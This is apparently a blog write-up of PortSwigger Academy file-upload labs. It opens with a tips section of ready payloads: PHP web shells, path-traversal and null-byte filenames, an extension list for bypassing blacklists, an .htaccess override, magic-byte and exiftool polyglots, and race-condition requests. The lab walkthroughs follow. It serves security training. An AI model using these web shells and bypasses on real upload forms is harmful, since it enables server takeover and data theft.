---
layout: single
title: File upload - PortSwigger
excerpt: "All File upload vulnerabilities of PortSwigger."
date: 2025-09-27
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - File Upload
  - Web Shells
---


## TIPS

- Path Traversal to bypass restriction

```http
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fexploit.php"
Content-Type: application/x-php

<?php system("cat /home/carlos/secret"); ?>
```

- Null Byte

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00png"
Content-Type: application/x-php

<?php system("cat /home/carlos/secret"); ?>
```

- Extension blacklist bypass

```
php
php2
php3
php4
php5
php6
php7
phps
pht
phtm
phtml
pgif
shtml
htaccess
phar
inc
hphp
ctp
module
php
php4
php5
phtml
module
inc
hphp
ctp
```

- .htaccess

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .test
```

```http
Content-Disposition: form-data; name="avatar"; filename="cmd.test"
Content-Type: application/x-php

<?php system($_GET[0]);?>
```

- Magik Numbers

```http
Content-Disposition: form-data; name="avatar"; filename="cmd.php"
Content-Type: application/octet-stream

GIF8;

<?php system($_GET[0]);?>
```

- Metadata

```bash
exiftool -Comment='<?php system($_GET[0]);?>' cmd.png -o cmd.php
```

- Race Condition

![](/img2/Pasted%20image%2020250927221338.png)

```http
- REQ 1 -
Content-Disposition: form-data; name="avatar"; filename="cmd.php"
Content-Type: application/octet-stream

<?php system($_GET[0]);?>


- REQ 2 -
GET /files/avatars/cmd.php?0=whoami HTTP/2
```

## Ejecución remota con web shell subida || Remote code execution via web shell upload


![](/img2/Pasted%20image%2020250925143820.png)

```php
<?php system($_GET[0]);?>
```

> We upload a malicious php file in the add avatar function.

![](/img2/Pasted%20image%2020250925143937.png)

> We point to the uploaded "image" and see that it executes the php code.

## Web shell por bypass de Content-Type || Web shell upload via Content-Type restriction bypass

![](/img2/Pasted%20image%2020250927114713.png)

> When uploading a php file we see a validation is applied on the Content-Type.

![](/img2/Pasted%20image%2020250927114819.png)

> If we change the Content-Type of the file we bypass the restriction without changing the file contents.

![](/img2/Pasted%20image%2020250927114917.png)

## Web shell por path traversal || Web shell upload via path traversal

![](/img2/Pasted%20image%2020250908183034.png)

> We upload a malicious php file in the avatars section.

![](/img2/Pasted%20image%2020250908183138.png)

> When accessing the php file we see the server has some restriction that prevents executing its contents.

![](/img2/Pasted%20image%2020250908183233.png)

![](/img2/Pasted%20image%2020250908183302.png)

> We try to upload the file with a Path Traversal, however the server does not find the file.

![](/img2/Pasted%20image%2020250908183740.png)

> If we try to bypass the Path Traversal restriction with URL-encoding, i.e. ../../exploit.php -> %2e%2e%2f%2e%2e%2fexploit.php, it seems the server attempts to upload a file to the root. That is why it returns forbidden.

![](/img2/Pasted%20image%2020250908184005.png)

> We apply the same bypass but target the /files directory. In this case the upload is allowed.

![](/img2/Pasted%20image%2020250908184124.png)

> We point to the file and observe code execution.

## Web shell por bypass de blacklist de extensiones || Web shell upload via extension blacklist bypass

- Method 1

![](/img2/Pasted%20image%2020250927131524.png)

> When uploading a php file we see a validation on the extension.

![](/img2/Pasted%20image%2020250927131619.png)

![](/img2/Pasted%20image%2020250927131637.png)

> Using intruder we use a wordlist to upload files with php-like extensions.

![](/img2/Pasted%20image%2020250927131748.png)

![](/img2/Pasted%20image%2020250927131825.png)

> After uploading the files with various extensions we run a second intruder to check which files are interpreted as php. By filtering on response length we see that the phar extension executes php code.

![](/img2/Pasted%20image%2020250927132033.png)

- Method 2

![](/img2/Pasted%20image%2020250927132119.png)

> We use a .htaccess file to add additional extensions.

![](/img2/Pasted%20image%2020250927132204.png)

> Once the .test extension is added via .htaccess we can upload a php file with the custom extension.

![](/img2/Pasted%20image%2020250927132309.png)

## Web shell con extensión de archivo ofuscada || Web shell upload via obfuscated file extension

![](/img2/Pasted%20image%2020250908200206.png)

> We attempt to upload a php file but the server only allows JPG and PNG extensions. At this point we must check where the extension is validated. In this case the validation only checks that the uploaded file ends with JPG or PNG.

![](/img2/Pasted%20image%2020250908200136.png)

> To bypass this restriction we use null bytes which disable the final extension. This only works on old servers.

## Ejecución remota con web shell multi-formato || Remote code execution via polyglot web shell upload

- Method 1

![](/img2/Pasted%20image%2020250927140749.png)

> When uploading the php file we see a server-side check validates that the file is a legitimate image.

![](/img2/Pasted%20image%2020250927140921.png)

> If we add the initial magic numbers of a png image we fool the server and insert php content as if it were an image.

![](/img2/Pasted%20image%2020250927141015.png)

- Method 2

```bash
exiftool -Comment='<?php system($_GET[0]);?>' cmd.png -o cmd.php
```

![](/img2/Pasted%20image%2020250927144505.png)

## Web shell por condición de carrera || Web shell upload via race condition

![](/img2/Pasted%20image%2020250927221008.png)

> When uploading the file we notice the response takes slightly longer than normal. This may be because some processing is applied to our file.

![](/img2/Pasted%20image%2020250927221149.png)

> We create a group with two requests. The first uploads the malicious file. The second requests the file we just uploaded before it is deleted. To send the requests at the same time we create a group and send the requests in parallel.